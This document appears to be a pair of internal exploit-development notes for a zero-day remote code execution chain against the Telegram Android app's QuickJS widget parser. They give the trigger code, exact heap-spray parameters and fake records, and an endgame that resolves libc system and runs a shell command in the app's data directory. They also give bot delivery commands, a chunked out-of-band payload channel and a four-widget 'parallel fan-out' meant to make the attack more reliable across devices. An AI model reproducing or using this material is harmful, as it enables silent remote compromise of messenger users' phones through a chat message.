# Android same-tag route (`route 2`)

This route keeps both the vulnerable bytecode and the fake records inside the
QuickJS arena. Arena memory is a plain `mmap` with tag 0, so the bug is
MTE-safe by construction. It is the Android route for a future memtag build.

## Why a separate route

The cross-tag route puts the vulnerable `JSFunctionBytecode` `b` in Scudo. On
an MTE-on build, `b` and the sprayed target have different allocation tags.
The first fake `JSVarDef` load faults.

Arena memory is not `PROT_MTE`. The kernel does not check its tags. If both
sides of the bug are arena blocks, the access is tag 0 → tag 0 and no tag check
fires.

## Geometry

Create the vulnerable function at runtime, as an anonymous function with no
float literals:

```js
var S = '"use strict"; globalThis.f = function ([] = eval("[]")) {'
      + ' var q1=0,q2=0,q3=0; return 0; };';
(0, eval)(S);
```

The bytecode is created **after** the spray. Its size is 313 bytes; with the
8-byte block header it is a 344-byte request, class 352.

The far target is:

```
vardefs = b + 128
target = vardefs + 20 * (1 + 65534) = b + 1,310,828
1,310,828 = 20 * 65,536 - 20 * 1 ... = 20 slabs of 65,536 minus 892
```

In practice the target is exactly **20 arena slabs** above `b`. On Android the
arena allocates 64 KiB slabs. The target page is a class-512 page filled by
the spray.

The working layout (`stage-a-v3.js`):

| Parameter | Value | Why |
|---|---:|---|
| `NP` | 4,000 | Number of class-512 `ArrayBuffer` data blocks (488 bytes each). 7 blocks per 4 KiB page. 4,000 blocks ≈ 35 slabs. |
| `NQ` | 2,600 | Number of 479-character strings, one per class-512 block, to fill the page metadata and keep the target page ours. |
| `N2` | 390 | `ArrayBuffer(320)` class-352 data blocks, to exhaust the class-352 free list so `b` is allocated in the current slab. |
| `D` | 600 | `ArrayBuffer(64)` drain blocks. |
| `T` | 600 | `ArrayBuffer(64)` victims. `T[598]` is freed. |
| `N1` (block count) | not used | The original 4,000-block data spray; `NP` is used instead. |

Each sprayed 488-byte data block is filled with a 20-byte record grid. The
record starts at data offset 228:

```
flags = 0x04 (captured)
scope_level = 5
scope_next = 4
var_name = 4 (a tagged integer, so JS_DupAtom is a no-op)
var_ref_idx = 4
```

The target offset is the same for every block index: user offset 252, data
offset 228. That is the fix for the earlier “foreign slot” crashes: no matter
which class-512 block `b + 1,310,828` lands in, the record is ours.

## Stage A v3

`stage-a-v3.js` is the device-proven stage A with two changes:

1. **Scudo-string GC priming.** Allocate 1,500 × 2 KB strings plus one object
   before the spray. This forces one GC before the spray and keeps the spray
   and the `eval` GC-free. The heap grows by about 3.26 MB, the string data is
   freed, and the arena is not disturbed.
2. **NP=4000 / NQ=2600.** The original NP=2600 gave the target page only a
   16/16 class-512 guarantee if the number of engine partially-free class-512
   slabs `S` was ≤ 51. The observed misses imply `S > 51` or an eval-time GC.
   NP=4000 tolerates `S ≤ 251`.

The stage A marker is:

```
S1 ABLEN[599]=327744 VLEN=327744
```

If the forge misses, the marker is `NOCORR` (or `ABLEN[599]=64`), not a crash.
The target page is ours by construction.

The stage A runs at 6 MiB and 8 MiB. The trigger charge is about 4.31 MB
without symbols and 5.86 MB with symbols. The 6 MiB profile is tight but
works.

## Stage B and the endgame

The endgame is the c2560s endgame with two changes:

- It writes the full 64-bit `realm` and `rt` values (no tag stripping). The
  c2560s version strips the tag with `p48`/`a48F`; that is not MTE-safe.
- The command path is the release package:
  `id>/data/data/org.telegram.messenger/files/n1`.

That write requires the widget process to have app-private data access. On the
measured beta 72979, the widget runs in an isolated process UID 99017
(`u:r:isolated_app:s0`); the same-tag parser primitive still works, but this
write is blocked. The Pixel 72801 device proof predates that beta change and
used the app process. Re-check the process model on the target build before
treating the write as reachable.

The stage B resolves the app base, the `free` GOT slot, and libc `system` at
runtime. The symbol-safe variant is 4,079 zlib9, 17 bytes under the bot limit.
The shipped v3 inline payload is 3,883 zlib9.

There are two delivery shapes:

### Inline endgame

`inline-endgame-72801.html` = stage A v3 + the 7,469-byte endgame in the same
page. 9,186 raw / 3,883 zlib9.

Host: `ABLEN[599]=327744` 3/3, full chain `END=HF OK` + 162-byte proof,
154-158 ms including process start. Device: not proven. The larger page
changes the pre-heap; the earlier inline attempts crashed in stage A at
`b+1,310,832` or hit a foreign page. v3's GC priming and NP=4000 are the fix,
but the device run is pending.

### Out-of-band endgame

`out-of-band-72801.html` = the exact stage A probe plus a fetch driver.
2,151 raw / 1,024 zlib9. The 7,469-byte endgame is split into 8 answers of
950, 950, …, 819 bytes.

Flow:

1. Stage A forges.
2. The driver calls `TelegramWidget.request("E0")` … `"E7"`.
3. The bot answers each query with `answerWidgetQuery(widget_query_id, data=chunk)`.
4. The driver joins the chunks, checks `len == 7469`, and `eval`s the result in
   the same runtime (`V` and `VAB` are globals).
5. The endgame sets `MEGA`; the marker becomes `… | G1/8 … G8/8 | HF HF OK`.

The host mock (`out-of-band-host-mock.html`) reproduces the same markers and a
162-byte proof 3/3. The device run is the campaign record
`ABLEN[599]=327744 … | G1/8 … G8/8 | HF HF OK`.

The burst driver (`out-of-band-burst-72801.html`, 2,151 raw / 1,025 zlib9)
sends E0-E4 back-to-back, waits 5.2 s, then sends E5-E7. Eight chunks in about
6 s instead of 40 s. The client allows five requests per 5 s; the burst uses
exactly five in the first window.

## Files

Payload paths are under `vulns/0day-2-RCE-PARSER-SCOPE/STAG/payloads/route2/`; the
builders are in `../scripts/`; the shared bot server is in `bot/`.

| File | Raw | zlib9 | What |
|---|---:|---:|---|
| `stage-a-probe-72801.html` | 1,566 | 686 | The corrected device-proven stage A probe. `S1 ABLEN[599]=327744 VLEN=327744 END=-`. |
| `src/stage-a-device-72801.js` | - | - | The stage-A source used by the probe. |
| `src/stage-a-v3.js` | - | - | Stage A v3 (GC priming, NP=4000/NQ=2600). |
| `inline-endgame-72801.html` | 9,186 | 3,883 | v3 + inline endgame. Host-proven. |
| `inline-endgame-host.html` | 16,865 | - | Host twin of the inline endgame. |
| `out-of-band-72801.html` | 2,151 | 1,024 | Stage A + fetch driver. |
| `out-of-band-burst-72801.html` | 2,151 | 1,025 | Stage A + burst driver. |
| `out-of-band-host-mock.html` | 18,011 | - | Host mock of the answer channel. |
| `bot/answer_server.py` | - | - | Long-poll answer server (`data` field). |
| `endgame-72801.js` | 7,469 | - | The dynamic Android endgame (release proof path). |
| `endgame-host.js` | 15,148 | - | Host endgame (host proof path). |
| `driver-out-of-band.js` | 1,636 | - | The driver (5.2 s pacing). |
| `driver-out-of-band-burst.js` | 1,636 | - | The burst driver. |
| `chunks/E0.txt` … `E7.txt` | 950×7 + 819 | - | The endgame split. |
| `chunks/manifest.json` | - | - | Lengths and per-chunk SHA-256. |
| `limits-probe-72801.html` | 2,833 | 1,320 | Answer-limit probe (P0-P8). |
| `tools/verify-72801.py` | - | - | Verifies the 72801 lib and payload sizes. |
| `builders/0day-2/stag/build_stage_a_device_page.py` | - | - | Rebuilds the 9,064-byte device page from the stage-A source. |

## Device results (Pixel 9, release 72801)

- Corrected stage A probe (686 zlib9): **hit** on the Pixel with MTE off:
  ```
  S1 ABLEN[599]=327744 VLEN=327744 END=-
  ```
  This is the device proof of the parser route on the release build.
- The first inline endgame page (9,064 raw / 3,814 zlib9) crashed in stage A:
  `SIGSEGV/SEGV_MAPERR`, fault `0x71f01fd738`, PC `0x174986c`,
  `x13 - x12 = 0x13FFEC`, fault `= x13+4`. That is the far read with a target
  slab outside the spray. The extra page text shifted the pre-heap.
- The out-of-band endgame reached `HF HF OK` (campaign record). The host mock
  reproduces it 3/3.
- The inline v3 endgame is host-proven, device-pending.
- The release APK has 0 `mt` mappings. MTE on/off is not the deciding factor
  on this build today; route 2 is insurance.

## Delivery

Send the widget as a new message to the private chat with the bot:

```sh
export BOT_TOKEN='…'
python3 bot/send_widget.py \
  --html inline-endgame-72801.html \
  --chat-id <chat id> \
  --allow-queries --background-query
```

For the out-of-band path, start the server first:

```sh
export BOT_TOKEN='…'
python3 bot/answer_server.py \
  --uid <your user id> \
  --chunks chunks \
  --state-dir state \
  --method answerWidgetQuery
```

Then send `out-of-band-72801.html` with `allow_queries` and
`background_query`. Keep the widget visible. At 5.2 s pacing, eight chunks take
about 40 s; the burst page takes about 6 s.

The server must be the only `getUpdates` consumer for the token. Stop other
pollers first, or the API returns `409 Conflict`.

## Limits

- The route-2 device geometry (20 contiguous slabs, target slot, phase) is
  host-proven. The release 72801 `JS_ARENA_SLABS` layout is inferred from
  strings, not from source. Treat a new build as unverified.
- The inline endgame's larger page shifts the pre-heap. The v3 GC priming is
  the fix; it is host-proven, not device-proven.
- The symbol-safe endgame is 4,079 zlib9, 17 bytes under the bot limit. There
  is no room for per-device tuning. Use the out-of-band path if you need to
  change the endgame.
- The proof path is package-specific:
  `org.telegram.messenger` for the release build,
  `org.telegram.messenger.beta` for the beta build. A wrong path makes the
  chain run but the proof file absent.
- The process model is build-specific. On beta 72979/72989 the widget is
  isolated (UID 99017/99024), so the app-private write is blocked. The route-2 geometry proof
  on Pixel 72801 and the 72979 containment result are different claims.
- No root is needed. The bot path is the intended delivery.

## Next

1. Run `inline-endgame-72801.html` on the Pixel and confirm
   `END=HF OK` within ~1 s.
2. If it misses safely (`NOCORR`), use the burst out-of-band page.
3. Run the parallel fan-out (`vulns/0day-2-RCE-PARSER-SCOPE/STAG/payloads/universal/parallel/`) on the Pixel
   and the Samsung. Host is 12/12; device is pending.
# Universal v3 and the parallel fan-out

The parser bug is the same on every build. The heap geometry is not. This page
describes the two attempts to make one package work across Android builds and
devices without per-device calibration:

1. **v3**: one widget with a deterministic-ish stage A and an inline endgame.
2. **Parallel fan-out**: four widgets in one chat open, two placement
   attempts each, first forger wins.

Both are host-proven. The device run is pending.

## v3: stage A with GC priming

`v3` is the route-2 stage A with three changes:

- Scudo-string GC priming (1,500 × 2 KB strings plus one object) before the
  spray. One GC runs before the spray; the spray and the eval are GC-free.
  This removes the `js_arena_trim` holes and GC-freed engine pages that moved
  `b` off the target page.
- `NP=4000`, `NQ=2600` (was 2600/2600). The extra pre-spray slabs guarantee
  that the +20 slab above `b` is a class-512 page created by the spray, for
  any slot index, as long as the number of engine partially-free class-512
  slabs `S ≤ 251`.
- A tagged-int `var_name` in the fake record, so `JS_DupAtom` is a no-op and
  the chain does not depend on the atom table.

The payload `vulns/0day-2-RCE-PARSER-SCOPE/STAG/payloads/route2/inline-endgame-72801.html` is v3 + the
7,469-byte inline endgame. 9,186 raw / 3,883 zlib9.

Host result: `ABLEN[599]=327744` 3/3; full chain `END=HF OK` + 162-byte
proof; 154-158 ms including process start. Device: not proven. The larger
page still changes the pre-heap; the GC priming is the fix, but the device run
is the next step.

## Parallel fan-out: four widgets, one open

The single-widget H calibration is replaced by a fan-out. Four widget messages
are sent to the same chat. They render in separate sandboxes (`widget.sandbox`
threads, 4-7 per process). Each widget runs stage A with **two attempts**:

- attempt 0 at one H value;
- a GC re-arm between attempts;
- attempt 1 at another H value.

The four variants use different `NP`/`NQ` tables. That gives up to eight
placement trials per chat open. A miss is a safe `NOCORR`; the widget stops.

The first widget that forges calls `TelegramWidget.request("E0")` immediately.
A first-wins server answers that widget with the eight endgame chunks and
answers every other widget with `X` (stop). The driver that receives `X` stops
and leaves the chat alone.

This turns the heap lottery into a race between sandboxes. It does not make the
exploit deterministic; it makes a miss cheap.

Host validation (`vulns/0day-2-RCE-PARSER-SCOPE/STAG/evidence/host-matrix.txt`):

```
host-mock-a  8M #1..3  S1 ABLEN[599]=327744 ATT=0 VLEN=327744 | HF HF OK
host-mock-b  8M #1..3  … | HF HF OK
host-mock-c  8M #1..3  … | HF HF OK
host-mock-d  8M #1..3  … | HF HF OK
host-mock-rearm 8M #1..3  ATT=1 … | HF HF OK
host-mock-a  6M        … | HF HF OK
host-mock-stop         … | STOP
host-mock-device-a      … | HF HF ERR NOANCHOR …   (expected on the host)
```

12/12 variant runs, 3/3 re-arm, 6 MiB profile, STOP path, and the safe
`NOANCHOR` for the device endgame on the host. The first-wins server passes
`--parallel-self-test`.

## Timing

- The first answer arrives in ~110-145 ms after the request.
- Background pacing is 5,000 ms per request. Eight chunks take ~37-42 s.
- A burst schedule (five requests in the first 5 s window, one 5.2 s wait,
  three more) takes ~6 s. The client allows five requests per 5 s; the server
  flood limit is also 5 per 5 s.
- The parallel fan-out shortens the time to the first **forge**, not the chunk
  pipeline.

## Files

Payload paths are under `vulns/0day-2-RCE-PARSER-SCOPE/STAG/payloads/universal/parallel/`; the first-wins
server is under `bot/`.

| File | What |
|---|---|
| `device-widget-a.html` … `device-widget-d.html` | The four device widgets: stage A (two attempts) + answer-channel driver. 2,764 raw / 1,270-1,274 zlib9. |
| `host-mock-a.html` … `host-mock-d.html` | Host mocks: same stage A + mock `TelegramWidget` + host endgame. |
| `host-mock-rearm.html` | Forced-miss twin: attempt 0 skips the trigger, attempt 1 hits (`ATT=1`). |
| `host-mock-stop.html` | Mock returning the STOP sentinel `X`. |
| `stage-a-a.js` … `stage-a-d.js` | The four stage-A instances. |
| `stage-a-rearm.js` | The re-arm twin. |
| `build_parallel.py` | Rebuilds the widgets, mocks, chunks, and `send-batch.json`. |
| `bot/answer_server_first_wins.py` | The first-wins answer server. |
| `send-batch.json` | The four `sendWidget` bodies (height 50, `allow_queries`, `background_query`). Set your `chat_id`. |
| `run_host.sh` | The host matrix. |
| `chunks/` | Device endgame, 8 × 1,000 B, with a manifest. |
| `chunks_beta/` | Same chunks with the Sony beta proof path. |
| `design.md` | The design notes. |

## Commands

Build and test on the host:

```sh
cd vulns/0day-2-RCE-PARSER-SCOPE/STAG/payloads/universal/parallel
python3 build_parallel.py
./run_host.sh
```

Send the four widgets:

```sh
export BOT_TOKEN='…'
python3 bot/send_widget.py \
  --html device-widget-a.html --chat-id <chat id> \
  --allow-queries --background-query
# repeat for b, c, d
```

Or use `send-batch.json` with a client that accepts a batch of `sendWidget`
bodies. The JSON has `chat_id: 0`; replace it.

Start the first-wins server:

```sh
export BOT_TOKEN='…'
python3 bot/answer_server_first_wins.py --self-test
python3 bot/answer_server_first_wins.py --uid <your user id> --chunks chunks
```

Keep the chat open. The widgets run on render. Read the markers from the
bubbles; the first `HF HF OK` is the win.

## Honest boundary

- The parallel package is **host-only** at the time of writing. Device runs are
  pending on the Pixel and the Samsung.
- “Universal” here means across the tested Android builds and devices with the
  same engine generation. It does **not** mean the same payload works on iOS.
  The iOS geometry is hole-reuse; the Android geometry is arena slabs.
- A single ≤1,024-byte answer cannot carry the 7,469-byte endgame. The answer
  channel buys placement independence, not 1-second latency.
- If the endgame's proof path is wrong (beta vs release package), the chain
  runs but the proof file is absent. Check the package in `endgame-72801.js`.

## Next

1. Run the four widgets on the Pixel (release 72801) with the release chunks.
2. Run them on the Samsung when it arrives, with the beta chunks if the
   package is the beta build.
3. Record the first marker, the winning variant, and the time to `HF HF OK`.
